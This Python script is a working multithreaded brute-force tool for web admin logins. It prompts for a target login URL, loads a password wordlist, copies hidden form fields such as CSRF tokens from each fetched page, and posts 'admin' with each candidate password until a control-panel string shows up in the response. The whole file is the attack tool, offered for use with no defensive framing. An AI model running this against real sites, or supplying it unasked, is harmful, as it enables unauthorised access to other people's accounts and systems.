import urllib.parse
import urllib.request
import urllib3
import threading
from http import cookiejar
import sys
import queue
import logging
from html.parser import HTMLParser

# CONFIGURATION
user_thread = 10
username = "admin"
wordlist_file = "Enter your wordlist path here: (e.g cain-and-abel.txt)"
resume = None

# Target-specific fields
target_url = input("🌐 Enter the target login page URL: ").strip()
target_post = input("🔐 Enter the form submission (POST) URL: ").strip()

username_field = "username"
password_field = "passwd"
success_check = "Administraion - Control Panel"

# Logger setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


class Bruter:
    def __init__(self, username, words):
        self.username = username
        self.password_q = queue.Queue()
        self.found = False

        for word in words:
            self.password_q.put(word.strip())

        print(f"[+] Loaded {self.password_q.qsize()} passwords for: {username}")

    def run_bruteforce(self):
        for _ in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get()
            jar = cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

            try:
                response = opener.open(target_url)
                page = response.read().decode()

                logging.info(f"Trying: {self.username} : {brute} ({self.password_q.qsize()} left)")

                # Parse out the hidden fields
                parser = BruteParser()
                parser.feed(page)

                post_tags = parser.tag_results

                # Add credentials
                post_tags[username_field] = self.username
                post_tags[password_field] = brute

                login_data = urllib.parse.urlencode(post_tags).encode()
                login_response = opener.open(target_post, login_data)
                login_results = login_response.read().decode()

                if success_check in login_results:
                    self.found = True
                    logging.info("[✅] Bruteforce Successful!")
                    logging.info(f"[*] Username: {self.username}")
                    logging.info(f"[*] Password: {brute}")
                    logging.info("[*] Waiting for other threads to abort...")

            except Exception as e:
                logging.error(f"[!] Error: {e}")


class BruteParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None

            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

            if tag_name:
                self.tag_results[tag_name] = tag_value or ""


# Main execution
if __name__ == "__main__":
    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as file:
        words = file.readlines()

    if resume:
        try:
            start_index = words.index(resume)
            words = words[start_index:]
        except ValueError:
            print(f"[!] Resume word '{resume}' not found, starting from beginning.")

    bruter = Bruter(username, words)
    bruter.run_bruteforce()
